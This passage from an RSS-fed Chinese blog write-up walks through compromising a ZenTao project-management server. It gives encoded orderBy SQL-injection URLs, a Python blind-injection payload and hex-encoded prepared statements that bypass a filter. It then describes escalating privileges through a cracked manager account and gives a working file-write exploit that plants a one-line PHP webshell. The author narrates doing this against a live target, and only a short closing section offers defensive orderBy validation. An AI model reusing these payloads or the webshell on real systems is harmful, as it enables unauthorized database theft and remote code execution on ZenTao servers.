lang=&quot;text&quot;&gt;http://example.com/index.php?m=block&amp;amp;f=main&amp;amp;mode=getblockdata&amp;amp;blockid=case&amp;amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKHBvbHlnb24oaWQpLDEpIyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0=
-
-param base64解码
-{&quot;orderBy&quot;:&quot;order limit 1,1 PROCEDURE ANALYSE(polygon(id),1)#&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-56760516eb1da1fa547b876b9838bd67_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2544&quot;&gt;&lt;p&gt;上图为本地测试，但是limit的注入和mysql版本还有一些关系，目前网上的payload仅限于低版本才可报错注入出数据，很不幸运的是，目标使用的是高版本mysql。&lt;/p&gt;&lt;p&gt;那既然可以多语句，在不能用&lt;code class=&quot;inline&quot;&gt;information_schema&lt;/code&gt;的情况下，可以通过下面语法来进行盲注：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;show table status where name = &#39;xxx&#39; and sleep(2)&lt;/code&gt;&lt;p&gt;写到py里面的payload是这样的&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;sql = &quot;show table status where hex(substr(name,1,8))=&#39;7a745f75736572%s&#39; and sleep(2)&quot; % binascii.b2a_hex(chr(i))
-param = &#39;{&quot;orderBy&quot;:&quot;order limit 1,1;%s--&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&#39; % sql&lt;/code&gt;&lt;p&gt;经过一番折腾发现，表前缀就是默认的&lt;code class=&quot;inline&quot;&gt;zt_&lt;/code&gt;，但是为啥又不能够读取到用户数据呢?&lt;/p&gt;&lt;p&gt;仔细看到禅道里面的&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数，发现做了过滤。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$order = str_replace(array(&#39;|&#39;, &#39;&#39;, &#39;_&#39;), &#39; &#39;, $order);&lt;/code&gt;&lt;p&gt;把下划线给过滤掉了，那这种在多语句下，可以利用mysql的预查询来绕过，值得注意的是，这个版本语法大小写敏感。&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;SET @SQL=0x494E5345525420494E544F206D6F76696520286E616D652C20636F6E74656E74292056414C55455320282761616161272C27616161612729;PREPARE pord FROM @SQL;EXECUTE pord;SET @SQL=0x494E5345525420494E544F206D6F76696520286E616D652C20636F6E74656E74292056414C55455320282761616161272C27616161612729;PREPARE pord FROM @SQL;EXECUTE pord;&lt;/code&gt;&lt;p&gt;注入出admin密码的时候，惊喜地发现不能解开，无奈之下，只能先拿到一个普通账号。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Getshell&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;禅道在防止getshell方面还花了一点心思，曾经挖到一个可以任意写文件getshell（最新版本还存在这段代码），不过需要的权限是管理员权限。&lt;/p&gt;&lt;p&gt;看了一下禅道里面人员组织架构情况，有研发、项目经理、产品经理，高层管理，系统管理员等角色，其中系统管理员虽然密码解不开，但是我们可以去解密一下高层管理的密码，因为这个角色的权限是可以修改某用户的用户组权限。在高层管理账号中，我们可以将一个普通账号修改为管理员。&lt;/p&gt;&lt;p&gt;接下来就是写文件Getshell：&lt;/p&gt;&lt;p&gt;/xampp/zentaopro/module/api/control.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;public function getModel($moduleName, $methodName, $params = &#39;&#39;)
-{
-    parse_str(str_replace(&#39;,&#39;, &#39;&amp;amp;&#39;, $params), $params);
-    $module = $this-&amp;gt;loadModel($moduleName);
-    
-    $result = call_user_func_array(array(&amp;amp;$module, $methodName), $params);
-    if(dao::isError()) die(json_encode(dao::getError()));
-    $output[&#39;status&#39;] = $result ? &#39;success&#39; : &#39;fail&#39;;
-    $output[&#39;data&#39;]   = json_encode($result);
-    $output[&#39;md5&#39;]    = md5($output[&#39;data&#39;]);
-    $this-&amp;gt;output     = json_encode($output);
-    die($this-&amp;gt;output);
-}&lt;/code&gt;&lt;p&gt;可以看到是进入了call_user_func_array，也就是我们可以任意实例化一个module方法，方法的参数也是可控的，可以通过&lt;code class=&quot;inline&quot;&gt;,&lt;/code&gt;来分割参数。&lt;/p&gt;&lt;p&gt;/zentaopro/module/editor/model.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;public function save($filePath)
-{
-    $fileContent = $this-&amp;gt;post-&amp;gt;fileContent;
-    $evils       = array(&#39;eval&#39;, &#39;exec&#39;, &#39;passthru&#39;, &#39;proc_open&#39;, &#39;shell_exec&#39;, &#39;system&#39;, &#39;$$&#39;, &#39;include&#39;, &#39;require&#39;, &#39;assert&#39;);
-    $gibbedEvils = array(&#39;e v a l&#39;, &#39;e x e c&#39;, &#39; p a s s t h r u&#39;, &#39; p r o c _ o p e n&#39;, &#39;s h e l l _ e x e c&#39;, &#39;s y s t e m&#39;, &#39;$ $&#39;, &#39;i n c l u d e&#39;, &#39;r e q u i r e&#39;, &#39;a s s e r t&#39;);
-    $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent);
-    if(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent);
-
-    $dirPath = dirname($filePath);
-    $extFilePath = substr($filePath, 0, strpos($filePath, DS . &#39;ext&#39; . DS) + 4);
-    if(!is_dir($dirPath) and is_writable($extFilePath)) mkdir($dirPath, 0777, true);
-    if(is_writable($dirPath))
-    {
-        file_put_contents($filePath, $fileContent);
-    }
-    else
-    {
-        die(js::alert($this-&amp;gt;lang-&amp;gt;editor-&amp;gt;notWritable . $extFilePath));
-    }
-}&lt;/code&gt;&lt;p&gt;在editor中是可以写一个文件的，filePath可控，fileContent也是可控的，这下就是可以任意写一个文件。&lt;/p&gt;&lt;p&gt;Exp:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/?m=api&amp;amp;f=getModel&amp;amp;moduleName=editor&amp;amp;methodName=save&amp;amp;params=filePath=aaaaaa.php
-
-POST内容:
-fileContent=&amp;lt;?php $_POST[1]($_POST[2]);
-
-最后的shell地址是\zentaopro\module\api\aaaaaa.php&lt;/code&gt;&lt;p&gt;但是问题又来了，前面报错里面得到的路径目录感觉像是做了权限（这里绕弯了，路径少加了一个www，所以以为是没权限写），最终从数据库中的&lt;code class=&quot;inline&quot;&gt;zt_file&lt;/code&gt;获取上传文件的路径，然后再将shell写入当中才得以结束。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;对于&lt;code class=&quot;inline&quot;&gt;order by&lt;/code&gt;的漏洞如何进行防御的时候，我觉得上面代码在部分上有可取之处。&lt;/p&gt;&lt;p&gt;1、去掉&lt;code class=&quot;inline&quot;&gt;limit&lt;/code&gt;部分，然后限制格式&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;if(!preg_match(&#39;/^(\w+\.)?(`\w+`|\w+)( +(desc|asc))?( *(, *(\w+\.)?(`\w+`|\w+)( +(desc|asc))?)?)*$/i&#39;, $orders)) die(&quot;Order is bad request, The order is $orders&quot;);&lt;/code&gt;&lt;p&gt;2、然后循环对每个字段进行反引号的添加&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$orders = explode(&#39;,&#39;, $orders);
-foreach ($orders as $i =&amp;gt; $order) {
-	$orderParse = explode(&#39; &#39;, trim($order));
-	foreach ($orderParse as $key =&amp;gt; $value) {
-		$value = trim($value);
-		if (empty($value) or strtolower($value) == &#39;desc&#39; or strtolower($value) == &#39;asc&#39;) {
-			continue;
-		}
-
-		$field = $value;
-		/* such as t1.id field. */
-		if (strpos($value, &#39;.&#39;) !== false) {
-			list($table, $field) = explode(&#39;.&#39;, $field);
-		}
-
-		if (strpos($field, &#39;`&#39;) === false) {
-			$field = &quot;`$field`&quot;;
-		}
-
-		$orderParse[$key] = isset($table) ? $table . &#39;.&#39; . $field : $field;
-		unset($table);
-	}
-	$orders[$i] = join(&#39; &#39;, $orderParse);
-	if (empty($orders[$i])) {
-		unset($orders[$i]);
-	}
-
-}&lt;/code&gt;&lt;p&gt;整个过程就是自己在挖莫名其妙的坑，然后再一个个慢慢补上，希望能够对大家有用。&lt;/p&gt;</description>
-<author>小蘑菇</author>
-<guid isPermaLink="false">2018-03-07-34275981</guid>
-<pubDate>Wed, 07 Mar 2018 00:00:00 +0800</pubDate>
 </item>
 </channel>
 </rss>
